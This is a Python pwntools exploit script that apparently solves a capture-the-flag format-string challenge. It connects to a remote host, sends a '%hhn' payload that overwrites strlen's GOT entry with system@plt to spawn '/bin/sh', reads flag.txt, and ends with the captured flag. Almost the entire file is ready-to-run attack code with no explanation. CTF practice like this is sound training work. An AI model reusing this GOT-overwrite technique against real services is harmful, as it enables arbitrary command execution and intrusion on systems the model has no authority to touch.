#!/usr/bin/env python3
from platform import system
from pwn import *
import binascii
import sys

exe_path = 'fmt_2_patched'
HOST = '103.77.175.40'
PORT = 6111

exe = ELF(exe_path, checksec=False)
libc = ELF('libc6_2.39-0ubuntu1_amd64.so', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x4012cd 

c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here 64bit
strlen_got = 0x404008
system_plt = 0x4010e0
payload = b'/bin/sh;'
payload += b"%217c%9$hhn"
payload = payload.ljust(24, b"A")
payload += p64(strlen_got)

log.info(f'payload : {payload}')
p.sendlineafter(b'tell us?: ', payload)
p.sendline(b'cat flag.txt')
p.interactive()

#BKSEC{w4it_i_GOT-s0m3tH1n9_t0_7ell_Di493eax3a4}